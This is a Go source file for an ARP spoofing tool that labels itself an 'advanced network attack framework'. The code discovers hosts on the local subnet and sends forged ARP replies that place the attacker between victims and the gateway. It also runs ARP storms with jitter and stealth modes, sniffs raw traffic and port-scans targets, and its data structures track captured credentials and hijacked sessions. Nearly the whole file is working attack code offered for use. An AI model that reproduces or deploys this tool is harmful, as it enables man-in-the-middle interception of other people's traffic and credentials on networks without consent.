package arp

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE ARP SPOOFER v3.0 — ADVANCED NETWORK ATTACK FRAMEWORK
// ══════════════════════════════════════════════════════════════════════════════

type AdvancedARPSpoofer struct {
	// Network Configuration
	iface      *net.Interface
	ifaceName  string
	attackerIP net.IP
	attackerMAC net.HardwareAddr
	gatewayIP  net.IP
	gatewayMAC net.HardwareAddr
	subnet     *net.IPNet

	// Target Management
	targets   map[string]*ARPAdvancedTarget
	targetsMu sync.RWMutex

	// Attack Control
	running  bool
	stopChan chan struct{}
	mode     ARPAdvancedMode
	interval time.Duration
	jitter   float64

	// Raw Sockets
	sendFD  int
	sniffFD int

	// Statistics
	stats *ARPAdvancedStats

	// Advanced Features
	sslStrip      bool
	dhcpSpoof     bool
	sessionHijack bool

	// Logging
	verbose bool
}

type ARPAdvancedMode int

const (
	ARPAdvancedModePassive    ARPAdvancedMode = iota
	ARPAdvancedModeSelective
	ARPAdvancedModeAggressive
	ARPAdvancedModeStealth
	ARPAdvancedModeParanoid
)

type ARPAdvancedTarget struct {
	IP          net.IP
	MAC         net.HardwareAddr
	Hostname    string
	Vendor      string
	Status      ARPAdvancedTargetStatus
	PoisonCount int
	LastSeen    time.Time
	FirstSeen   time.Time
	Credentials []ARPAdvancedCredential
	Sessions    []ARPAdvancedSession
}

type ARPAdvancedTargetStatus int

const (
	ARPAdvancedStatusUnknown ARPAdvancedTargetStatus = iota
	ARPAdvancedStatusAlive
	ARPAdvancedStatusPoisoned
	ARPAdvancedStatusCompromised
)

type ARPAdvancedCredential struct {
	Username  string
	Password  string
	Service   string
	Timestamp time.Time
	SourceIP  string
}

type ARPAdvancedSession struct {
	Cookies   map[string]string
	Token     string
	Service   string
	Timestamp time.Time
	IsValid   bool
}

type ARPAdvancedStats struct {
	PacketsSent       int64
	PacketsReceived   int64
	ARPRepliesSent    int64
	ARPRequestsSent   int64
	TargetsPoisoned   int64
	CredentialsCaptured int64
	SessionsHijacked  int64
	SSLSessionsStripped int64
	StartTime         time.Time
}

// AdvancedARPConfig configures the advanced ARP spoofer
type AdvancedARPConfig struct {
	Interface    string
	GatewayIP    string
	TargetIPs    []string
	Mode         string
	IntervalMs   int
	Jitter       float64
	Verbose      bool
	Stealth      bool
	SSLEnable    bool
	DHCPEnable   bool
}

func NewAdvancedARPSpoofer(cfg AdvancedARPConfig) (*AdvancedARPSpoofer, error) {
	// Parse interface
	iface, err := net.InterfaceByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("interface '%s' not found: %w", cfg.Interface, err)
	}

	// Get attacker IP
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, fmt.Errorf("failed to get interface addresses: %w", err)
	}

	var attackerIP net.IP
	var subnet *net.IPNet
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
			attackerIP = ipNet.IP.To4()
			subnet = ipNet
			break
		}
	}
	if attackerIP == nil {
		return nil, fmt.Errorf("no IPv4 address found on interface %s", cfg.Interface)
	}

	// Parse gateway
	gatewayIP := net.ParseIP(cfg.GatewayIP).To4()
	if gatewayIP == nil {
		return nil, fmt.Errorf("invalid gateway IP: %s", cfg.GatewayIP)
	}

	// Parse attack mode
	mode := ARPAdvancedModeSelective
	switch strings.ToLower(cfg.Mode) {
	case "passive":
		mode = ARPAdvancedModePassive
	case "aggressive":
		mode = ARPAdvancedModeAggressive
	case "stealth":
		mode = ARPAdvancedModeStealth
	case "paranoid":
		mode = ARPAdvancedModeParanoid
	}

	// Parse interval
	interval := time.Duration(cfg.IntervalMs) * time.Millisecond
	if interval == 0 {
		interval = 500 * time.Millisecond
	}

	spoof := &AdvancedARPSpoofer{
		iface:       iface,
		ifaceName:   cfg.Interface,
		attackerIP:  attackerIP,
		attackerMAC: iface.HardwareAddr,
		gatewayIP:   gatewayIP,
		targets:     make(map[string]*ARPAdvancedTarget),
		stopChan:    make(chan struct{}),
		mode:        mode,
		interval:    interval,
		jitter:      cfg.Jitter,
		sendFD:      -1,
		sniffFD:     -1,
		subnet:      subnet,
		stats: &ARPAdvancedStats{
			StartTime: time.Now(),
		},
		verbose: cfg.Verbose,
	}

	return spoof, nil
}

// ══════════════════════════════════════════════════════════════════════════════
// CORE ATTACK FUNCTIONS
// ══════════════════════════════════════════════════════════════════════════════

func (s *AdvancedARPSpoofer) Start() error {
	// Open raw socket
	var err error
	s.sendFD, err = openRawSocket(s.iface.Index)
	if err != nil {
		return fmt.Errorf("failed to open raw socket (requires root): %w", err)
	}

	// Resolve gateway MAC
	s.gatewayMAC, err = resolveMACForAdvanced(s.gatewayIP, s.ifaceName)
	if err != nil {
		closeRawSocket(s.sendFD)
		return fmt.Errorf("failed to resolve gateway MAC: %w", err)
	}

	s.running = true

	log.Printf("[ARP ADVANCED] Starting on interface %s", s.iface.Name)
	log.Printf("[ARP ADVANCED] Mode: %s", s.getModeName())
	log.Printf("[ARP ADVANCED] Attacker: %s (%s)", s.attackerIP, s.attackerMAC)
	log.Printf("[ARP ADVANCED] Gateway: %s (%s)", s.gatewayIP, s.gatewayMAC)
	log.Printf("[ARP ADVANCED] Interval: %v (Jitter: %.1f%%)", s.interval, s.jitter*100)

	// Discover targets
	go s.discoverTargets()

	// Start attack loops
	go s.poisonLoop()
	go s.sniffLoop()
	go s.statsLoop()

	return nil
}

func (s *AdvancedARPSpoofer) Stop() {
	if !s.running {
		return
	}

	s.running = false
	close(s.stopChan)

	log.Printf("[ARP] Restoring ARP caches...")
	s.restoreARP()

	if s.sendFD > 0 {
		closeRawSocket(s.sendFD)
		s.sendFD = -1
	}

	s.printStats()
	log.Printf("[ARP] Advanced ARP spoofer stopped")
}

// ══════════════════════════════════════════════════════════════════════════════
// TARGET DISCOVERY
// ══════════════════════════════════════════════════════════════════════════════

func (s *AdvancedARPSpoofer) discoverTargets() {
	// Initial scan
	s.scanNetwork()

	// Periodic re-scan
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopChan:
			return
		case <-ticker.C:
			s.scanNetwork()
		}
	}
}

func (s *AdvancedARPSpoofer) scanNetwork() {
	if s.subnet == nil {
		return
	}

	baseIP := s.subnet.IP.Mask(s.subnet.Mask).To4()
	ones, bits := s.subnet.Mask.Size()
	hostBits := bits - ones
	maxHosts := (1 << hostBits) - 2
	if maxHosts > 254 {
		maxHosts = 254
	}

	for i := 1; i <= maxHosts; i++ {
		ip := make(net.IP, 4)
		copy(ip, baseIP)
		ip[3] = baseIP[3] + byte(i)

		if !s.subnet.Contains(ip) || ip.Equal(s.attackerIP) || ip.Equal(s.gatewayIP) {
			continue
		}

		s.sendARPRequest(ip)
		time.Sleep(2 * time.Millisecond)
	}

	// Wait for replies
	time.Sleep(1 * time.Second)
	s.readARPTable()
}

func (s *AdvancedARPSpoofer) readARPTable() {
	data, err := exec.Command("cat", "/proc/net/arp").Output()
	if err != nil {
		return
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines[1:] {
		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}

		ip := net.ParseIP(fields[0]).To4()
		if ip == nil || ip.Equal(s.attackerIP) || ip.Equal(s.gatewayIP) {
			continue
		}

		mac, err := net.ParseMAC(fields[3])
		if err != nil || mac.String() == "00:00:00:00:00:00" {
			continue
		}

		s.targetsMu.Lock()
		if _, exists := s.targets[ip.String()]; !exists {
			s.targets[ip.String()] = &ARPAdvancedTarget{
				IP:        ip,
				MAC:       mac,
				Status:    ARPAdvancedStatusAlive,
				FirstSeen: time.Now(),
				LastSeen:  time.Now(),
			}
			log.Printf("[ARP DISCOVER] Found host: %s (%s)", ip, mac)
		} else {
			s.targets[ip.String()].LastSeen = time.Now()
		}
		s.targetsMu.Unlock()
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// POISONING ENGINE
// ══════════════════════════════════════════════════════════════════════════════

func (s *AdvancedARPSpoofer) poisonLoop() {
	for {
		select {
		case <-s.stopChan:
			return
		default:
		}

		if s.mode != ARPAdvancedModePassive {
			s.sendPoisonPackets()
		}

		// Calculate interval with jitter
		jitter := time.Duration(float64(s.interval) * s.jitter * (rand.Float64()*2 - 1))
		time.Sleep(s.interval + jitter)
	}
}

func (s *AdvancedARPSpoofer) sendPoisonPackets() {
	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	// Send gratuitous ARP to gateway
	s.sendARPReply(s.gatewayIP, broadcastMAC, s.gatewayIP, s.attackerMAC)

	s.targetsMu.RLock()
	for _, target := range s.targets {
		if target.Status == ARPAdvancedStatusUnknown {
			continue
		}

		// Tell victim: "gateway is at MY MAC"
		s.sendARPReply(target.IP, target.MAC, s.gatewayIP, s.attackerMAC)

		// Tell gateway: "victim is at MY MAC"
		s.sendARPReply(s.gatewayIP, s.gatewayMAC, target.IP, s.attackerMAC)

		target.PoisonCount++
		atomic.AddInt64(&s.stats.ARPRepliesSent, 2)
	}
	s.targetsMu.RUnlock()
}

func (s *AdvancedARPSpoofer) restoreARP() {
	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	for i := 0; i < 10; i++ {
		// Restore gateway
		s.sendARPReply(s.gatewayIP, broadcastMAC, s.gatewayIP, s.gatewayMAC)

		s.targetsMu.RLock()
		for _, target := range s.targets {
			// Restore victim
			s.sendARPReply(target.IP, target.MAC, s.gatewayIP, s.gatewayMAC)
			// Restore gateway entry for victim
			s.sendARPReply(s.gatewayIP, s.gatewayMAC, target.IP, target.MAC)
		}
		s.targetsMu.RUnlock()

		time.Sleep(200 * time.Millisecond)
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// ADVANCED FEATURES
// ══════════════════════════════════════════════════════════════════════════════

// ARPRequestStorm sends a flood of ARP requests to discover all hosts
func (s *AdvancedARPSpoofer) ARPRequestStorm() {
	log.Printf("[ARP] Starting ARP request storm...")

	if s.subnet == nil {
		return
	}

	baseIP := s.subnet.IP.Mask(s.subnet.Mask).To4()

	for i := 1; i <= 254; i++ {
		ip := make(net.IP, 4)
		copy(ip, baseIP)
		ip[3] = byte(i)

		if !s.subnet.Contains(ip) {
			continue
		}

		s.sendARPRequest(ip)
		time.Sleep(1 * time.Millisecond)
	}

	log.Printf("[ARP] ARP request storm complete")
}

// GratutiousARPStorm sends gratuitous ARP to poison all caches
func (s *AdvancedARPSpoofer) GratutiousARPStorm() {
	log.Printf("[ARP] Starting gratuitous ARP storm...")

	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	for i := 0; i < 100; i++ {
		// Claim to be gateway
		s.sendARPReply(s.gatewayIP, broadcastMAC, s.gatewayIP, s.attackerMAC)

		// Claim to be various IPs
		for _, target := range s.GetTargets() {
			s.sendARPReply(target.IP, target.MAC, s.gatewayIP, s.attackerMAC)
		}

		time.Sleep(10 * time.Millisecond)
	}

	log.Printf("[ARP] Gratuitous ARP storm complete")
}

// PortScan performs a stealthy port scan on a target
func (s *AdvancedARPSpoofer) PortScan(targetIP net.IP, ports []int) map[int]bool {
	log.Printf("[ARP] Port scanning %s...", targetIP)

	openPorts := make(map[int]bool)

	for _, port := range ports {
		// TCP SYN scan
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, port), 1*time.Second)
		if err == nil {
			openPorts[port] = true
			conn.Close()
		}
	}

	log.Printf("[ARP] Port scan complete: %d open ports found", len(openPorts))
	return openPorts
}

// ClearARPCache clears the local ARP cache
func (s *AdvancedARPSpoofer) ClearARPCache() error {
	cmd := exec.Command("ip", "neighbor", "flush", "all")
	return cmd.Run()
}

// ResetNetwork resets network configuration
func (s *AdvancedARPSpoofer) ResetNetwork() error {
	// Clear ARP cache
	s.ClearARPCache()

	// Reset IP forwarding
	exec.Command("sysctl", "-w", "net.ipv4.ip_forward=0").Run()

	// Flush iptables
	exec.Command("iptables", "-F").Run()
	exec.Command("iptables", "-t", "nat", "-F").Run()

	return nil
}

// ══════════════════════════════════════════════════════════════════════════════
// PACKET OPERATIONS
// ══════════════════════════════════════════════════════════════════════════════

func (s *AdvancedARPSpoofer) sendARPReply(dstIP net.IP, dstMAC net.HardwareAddr, spoofIP net.IP, spoofMAC net.HardwareAddr) {
	if s.sendFD < 0 {
		return
	}

	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	if dstMAC == nil {
		dstMAC = broadcastMAC
	}

	ethHeader := buildEthernetHeader(dstMAC, spoofMAC, ETH_P_ARP)
	arpPayload := buildARPReply(spoofMAC, spoofIP.To4(), dstMAC, dstIP.To4())
	packet := append(ethHeader, arpPayload...)

	sendOnSocket(s.sendFD, s.iface.Index, packet)
	atomic.AddInt64(&s.stats.ARPRepliesSent, 1)
}

func (s *AdvancedARPSpoofer) sendARPRequest(targetIP net.IP) {
	if s.sendFD < 0 {
		return
	}

	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	ethHeader := buildEthernetHeader(broadcastMAC, s.attackerMAC, ETH_P_ARP)
	arpPayload := buildARPRequest(s.attackerMAC, s.attackerIP.To4(), targetIP.To4())
	packet := append(ethHeader, arpPayload...)

	sendOnSocket(s.sendFD, s.iface.Index, packet)
	atomic.AddInt64(&s.stats.ARPRequestsSent, 1)
}

// ══════════════════════════════════════════════════════════════════════════════
// SNIFFING
// ══════════════════════════════════════════════════════════════════════════════

func (s *AdvancedARPSpoofer) sniffLoop() {
	fd, err := openRawSocket(s.iface.Index)
	if err != nil {
		log.Printf("[ARP] Failed to open sniff socket: %v", err)
		return
	}
	defer closeRawSocket(fd)

	buf := make([]byte, 65535)

	for s.running {
		n, _, err := recvFromSocket(fd, buf)
		if err != nil {
			if s.running {
				continue
			}
			return
		}

		if n < 14 {
			continue
		}

		packet := make([]byte, n)
		copy(packet, buf[:n])

		go s.processPacket(packet)
	}
}

func (s *AdvancedARPSpoofer) processPacket(packet []byte) {
	if len(packet) < 14 {
		return
	}

	ethType := binary.BigEndian.Uint16(packet[12:14])

	// Handle ARP packets
	if ethType == ETH_P_ARP {
		s.processARPPacket(packet)
		return
	}

	// Handle IP packets
	if ethType == ETH_P_IP {
		s.processIPPacket(packet)
		return
	}
}

func (s *AdvancedARPSpoofer) processARPPacket(packet []byte) {
	if len(packet) < 42 {
		return
	}

	arpHeader, err := parseARPHeader(packet[14:])
	if err != nil {
		return
	}

	// ARP Reply - learn MAC addresses
	if arpHeader.Opcode == 2 {
		arpSrcIP := net.IP(arpHeader.SenderIP)
		arpSrcMAC := net.HardwareAddr(arpHeader.SenderMAC)

		s.targetsMu.Lock()
		if target, exists := s.targets[arpSrcIP.String()]; exists {
			target.MAC = arpSrcMAC
			target.LastSeen = time.Now()
			target.Status = ARPAdvancedStatusAlive
		} else if !arpSrcIP.Equal(s.attackerIP) && !arpSrcIP.Equal(s.gatewayIP) {
			s.targets[arpSrcIP.String()] = &ARPAdvancedTarget{
				IP:        arpSrcIP,
				MAC:       arpSrcMAC,
				Status:    ARPAdvancedStatusAlive,
				FirstSeen: time.Now(),
				LastSeen:  time.Now(),
			}
		}
		s.targetsMu.Unlock()
	}
}

func (s *AdvancedARPSpoofer) processIPPacket(packet []byte) {
	// Basic IP packet analysis
	if len(packet) < 34 {
		return
	}

	atomic.AddInt64(&s.stats.PacketsReceived, 1)
}

// ══════════════════════════════════════════════════════════════════════════════
// UTILITY FUNCTIONS
// ══════════════════════════════════════════════════════════════════════════════

func (s *AdvancedARPSpoofer) getModeName() string {
	switch s.mode {
	case ARPAdvancedModePassive:
		return "PASSIVE"
	case ARPAdvancedModeSelective:
		return "SELECTIVE"
	case ARPAdvancedModeAggressive:
		return "AGGRESSIVE"
	case ARPAdvancedModeStealth:
		return "STEALTH"
	case ARPAdvancedModeParanoid:
		return "PARANOID"
	default:
		return "UNKNOWN"
	}
}

func (s *AdvancedARPSpoofer) statsLoop() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopChan:
			return
		case <-ticker.C:
			s.printStats()
		}
	}
}

func (s *AdvancedARPSpoofer) printStats() {
	s.targetsMu.RLock()
	targetCount := len(s.targets)
	poisonedCount := 0
	for _, t := range s.targets {
		if t.Status == ARPAdvancedStatusPoisoned {
			poisonedCount++
		}
	}
	s.targetsMu.RUnlock()

	log.Printf("[ARP STATS] Targets: %d | Poisoned: %d | Packets: %d | ARP Replies: %d",
		targetCount, poisonedCount,
		atomic.LoadInt64(&s.stats.PacketsReceived),
		atomic.LoadInt64(&s.stats.ARPRepliesSent))
}

// GetTargets returns all discovered targets
func (s *AdvancedARPSpoofer) GetTargets() []*ARPAdvancedTarget {
	s.targetsMu.RLock()
	defer s.targetsMu.RUnlock()

	targets := make([]*ARPAdvancedTarget, 0, len(s.targets))
	for _, t := range s.targets {
		targets = append(targets, t)
	}

	sort.Slice(targets, func(i, j int) bool {
		return targets[i].IP.String() < targets[j].IP.String()
	})

	return targets
}

// GetStats returns attack statistics
func (s *AdvancedARPSpoofer) GetStats() ARPAdvancedStats {
	return ARPAdvancedStats{
		PacketsSent:       atomic.LoadInt64(&s.stats.PacketsSent),
		PacketsReceived:   atomic.LoadInt64(&s.stats.PacketsReceived),
		ARPRepliesSent:    atomic.LoadInt64(&s.stats.ARPRepliesSent),
		ARPRequestsSent:   atomic.LoadInt64(&s.stats.ARPRequestsSent),
		TargetsPoisoned:   atomic.LoadInt64(&s.stats.TargetsPoisoned),
		CredentialsCaptured: atomic.LoadInt64(&s.stats.CredentialsCaptured),
		SessionsHijacked:  atomic.LoadInt64(&s.stats.SessionsHijacked),
		StartTime:         s.stats.StartTime,
	}
}

func resolveMACForAdvanced(ip net.IP, iface string) (net.HardwareAddr, error) {
	// Try ARP table first
	mac, err := getARPEntryForAdvanced(ip)
	if err == nil {
		return mac, nil
	}

	// Try arping
	mac, err = arpingResolveForAdvanced(ip, iface)
	if err == nil {
		return mac, nil
	}

	// Try multiple ARP requests
	for i := 0; i < 5; i++ {
		time.Sleep(200 * time.Millisecond)
		mac, err = getARPEntryForAdvanced(ip)
		if err == nil {
			return mac, nil
		}
	}

	return nil, fmt.Errorf("could not resolve MAC for %s", ip)
}

func getARPEntryForAdvanced(ip net.IP) (net.HardwareAddr, error) {
	data, err := exec.Command("ip", "neighbor", "show", ip.String()).Output()
	if err != nil {
		return nil, err
	}

	output := string(data)
	if !strings.Contains(output, "lladdr") {
		return nil, fmt.Errorf("no ARP entry for %s", ip)
	}

	parts := strings.Fields(output)
	for i, part := range parts {
		if part == "lladdr" && i+1 < len(parts) {
			return net.ParseMAC(parts[i+1])
		}
	}

	return nil, fmt.Errorf("could not parse ARP entry for %s", ip)
}

func arpingResolveForAdvanced(ip net.IP, iface string) (net.HardwareAddr, error) {
	cmd := exec.Command("arping", "-c", "1", "-I", iface, ip.String())
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "reply") {
			parts := strings.Fields(line)
			for _, part := range parts {
				if strings.Contains(part, ":") && len(part) == 17 {
					return net.ParseMAC(part)
				}
			}
		}
	}

	return nil, fmt.Errorf("arping failed for %s", ip)
}
